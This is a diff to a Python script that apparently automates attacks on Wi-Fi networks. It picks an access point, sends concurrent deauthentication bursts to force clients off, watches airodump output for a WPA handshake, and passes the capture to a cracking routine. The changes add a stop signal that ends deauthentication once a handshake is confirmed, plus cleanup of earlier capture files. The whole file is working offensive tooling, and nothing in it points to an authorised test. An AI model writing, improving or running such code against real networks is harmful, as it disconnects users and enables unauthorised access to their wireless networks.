@@ -15,7 +15,22 @@ from scan_parser import parse_scan, choose_ap_by_name, choose_strongest_ap
 from scan_for_handshake import check_handshake, deauthenthicate, start_airodump_and_watch
 from crack import crack_cap
 
+def delete_scan_files(prefix: Path):
+    prefix = prefix.with_suffix("") 
+    suffixes = ["-01.csv", "-01.cap"]
+
+    for suf in suffixes:
+        f = Path(str(prefix) + suf)
+        if f.exists():
+            try:
+                os.remove(f)
+            except Exception:
+                pass
+
 def run(interactive: bool = True, iface: str | None = None, duration: int = 8, out_prefix: str | None = None, confirm: bool = True):
+
+	delete_scan_files(Path(__file__).resolve())
+
 	if interactive:
 		chosen = set_interfaces()
 		if not chosen:
@@ -70,6 +85,7 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 		proc = None
 
 		result = {"proc": None, "cap_path": None, "handshake_detected": False}
+		stop_event = threading.Event() 
 
 		def airodump_thread():
 			p, cap = start_airodump_and_watch(
@@ -83,6 +99,7 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 			result["cap_path"] = cap
 			if p and cap:
 				result["handshake_detected"] = True
+				stop_event.set()
 
 		t = threading.Thread(target=airodump_thread, daemon=True)
 		t.start()
@@ -99,14 +116,18 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 
 			max_workers = max(4, len(clients) if clients else 4)
 			with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exe:
-				while not ok and (time.time() - start_time) < timeout:
+				while not ok and (time.time() - start_time) < timeout and not stop_event.is_set():
 					futures = []
 
 					if clients:
 						for client in clients:
+							if stop_event.is_set():
+								break
 							futures.append(exe.submit(deauthenthicate, focus['bssid'], client, iface_to_use, 50))
 					else:
 						for i in range(10):
+							if stop_event.is_set():
+								break
 							futures.append(exe.submit(deauthenthicate, focus['bssid'], None, iface_to_use, 50))
 
 					if not futures:
@@ -114,10 +135,16 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 						continue
 
 					for future in concurrent.futures.as_completed(futures, timeout=180):
+						if stop_event.is_set():
+							for f in futures:
+								f.cancel()
+							break
 						try:
-							rc, out, err = future.result()
+							rc, out, err = future.result(timeout=5)
 						except concurrent.futures.TimeoutError:
 							print("A deauth task timed out.")
+							continue
+						except concurrent.futures.CancelledError:
 							continue
 						except Exception as e:
 							print(f"Deauth task raised exception: {e}")
@@ -126,6 +153,9 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 						if rc != 0:
 							err_msg = err.strip() if err else out.strip()
 							print(f'Deauth to client failed (rc={rc}): {err_msg}')
+
+					if stop_event.is_set():
+						break
 
 					time.sleep(burst_interval)
 
@@ -138,26 +168,29 @@ def run(interactive: bool = True, iface: str | None = None, duration: int = 8, o
 						if cap_path and check_handshake(cap_path):
 							print("Handshake confirmed from capture file (.cap).")
 							ok = True
+							stop_event.set()  
 							try:
 								crack_cap(cap_path)
 							except Exception as e:
 								print(f"Error occurred while cracking .cap file: {e}")
+							break
 						else:
 							print("Handshake reported in stdout but not yet verifiable in .cap — waiting briefly...")
 							time.sleep(2)
 							if cap_path and check_handshake(cap_path):
 								print("Handshake confirmed after short wait.")
 								ok = True
+								stop_event.set() 
 								try:
 									crack_cap(cap_path)
 								except Exception as e:
 									print(f"Error occurred while cracking .cap file: {e}")
 							break
 
-					# fallback: dacă avem cap_path dar nu am detectat încă handshake în stdout, verificăm periodic .cap
 					if cap_path and check_handshake(cap_path):
 						print("Handshake detected by parsing capture file.")
 						ok = True
+						stop_event.set() 
 						try:
 							crack_cap(cap_path)
 						except Exception as e:
